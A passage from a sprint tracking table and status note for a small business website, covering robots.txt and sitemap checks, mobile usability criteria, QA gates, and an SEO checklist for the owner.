| S23-5 | robots.txt points at the sitemap; the sitemap lists the home page with a current lastmod | SEO |
| S23-6 | On a 360/390 px phone: DOM ready under 3 s, the H1 readable and on screen, no sideways scroll, six FAQ rows at 44 px that open to a full answer | UX |
| S23-7 | Gates 12/12 twice; mutations caught; independent review; a step-by-step list for the owner's side (Google Business Profile, Search Console, directories, reviews, photos) | QA |

**Sprint 23 status:** approved by the independent review in round 1 (c067245), should-fixes taken (d578ea3). Gates 12/12 ×2, 3,520. Owner confirmed address, hours and phone on 10 Nov. Merged to ai/test. No migration. Owner-side steps: docs/ai-team/SEO_OWNER_CHECKLIST.md.
